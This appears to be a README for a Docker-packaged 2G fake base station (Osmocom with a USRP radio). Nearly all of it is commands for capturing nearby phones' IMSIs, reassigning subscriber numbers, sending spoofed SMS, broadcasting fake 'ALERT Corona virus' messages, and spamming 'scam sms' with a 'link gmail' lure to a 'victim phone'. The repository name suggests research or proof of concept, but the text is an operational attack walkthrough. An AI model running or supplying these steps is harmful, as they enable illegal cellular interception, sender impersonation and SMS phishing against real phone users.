# Dockerfile
at [Dockerfile.bulk2g_usrp](https://github.com/SitrakaResearchAndPOC/Bulk2g_docker/blob/main/bulk2g_usrp/Dockerfile.bulk2g_usrp)
```
docker build -t bulk2g_usrp -f Dockerfile.bulk2g_usrp .
```
```
docker rm -f bulk2g_usrp
```
```
 docker run -tid --privileged --cgroupns=host --net=host -v /sys/fs/cgroup:/sys/fs/cgroup:rw -v /dev:/dev -v /dev/bus/usb:/dev/bus/usb -v /tmp/.X11-unix:/tmp/.X11-unix:ro -v $XAUTHORITY:/home/user/.Xauthority:ro --tmpfs /run --tmpfs /run/lock --env="DISPLAY=$DISPLAY" --env="LC_ALL=C.UTF-8" --env="LANG=C.UTF-8" --name bulk2g_usrp --hostname bulk2g_usrp bulk2g_usrp
```
```
docker exec -it bulk2g_usrp bash
```
```
docker exec -it bulk2g_usrp uhd_usrp_probe
```
```
docker exec -it bulk2g_usrp uhd_find_devices 
```
```
docker exec -it bulk2g_usrp osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```

# Launching spoofing 1
ctrl+shift+t
```
docker exec -it bulk2g_usrp python3 osmo-nitb-scripts/main_uhd_spoof.py
```
Testing USRP SpoofScript1 :
```
docker exec -it bulk2g_usrp bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
```
You could find imsi and extension </br>
let's see for example IMSI as 646040222463674 and as 126 </br>
```
docker exec -it bulk2g_usrp bash osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh <IMSI> 0341220590
```
Verify by if the association is correct let's see for example imsi as 646040222463674 and extension as 0341220590
```
docker exec -it bulk2g_usrp  bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
```
Tape *#*#4636#*#* and choose GSM only on your Android phone </br>
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01 </br>
Tape *#001# for finding your phone number (extension with osmo-bts) </br>
```
docker exec -it bulk2g_usrp  python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 
```
log should be : subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus

# Spoofing script2

Testing USRP SpoofScript2 :  </br>
ctrl+shift+T
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
```
You could find imsi and extension Create a virtual extension 0341220590 and send sms to existing EXTENSION eg : 164
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts/scripts_spoof2/sms_spam.py <EXTENSION> 3 "link gmail"
```
More debug  
```
docker exec -it bulk2g_usrp telnet 127.0.0.1 4242
```
You could find imsi and extension
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_spam.py <EXTENSION> 3 "link gmail"
```
You could find imsi and extension
```
docker exec -ti bulk2g_usrp python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension 165
```
docker exec -it bulk2g_usrp python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension
```
docker exec -ti bulk2g_usrp  python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py
```

# Fake SMS Sender
Testing USRP Fake SMS Sender: </br>
RESTART ALL : </br>
```
docker exec -it bulk2g_usrp  osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Tape ctrl+shift+T
```
docker exec -it bulk2g_usrp python3 osmo-nitb-scripts/main_uhd.py
```
Add victim phone and tape Tape ctrl+shift+T
```
docker exec -ti bulk2g_usrp  cat osmo-nitb-scripts/interact.py
```
```
docker exec -ti bulk2g_usrp  python3 osmo-nitb-scripts/interact.py
```

docker exec -it bulk2g_usrp python3 osmo-nitb-scripts/interact.py

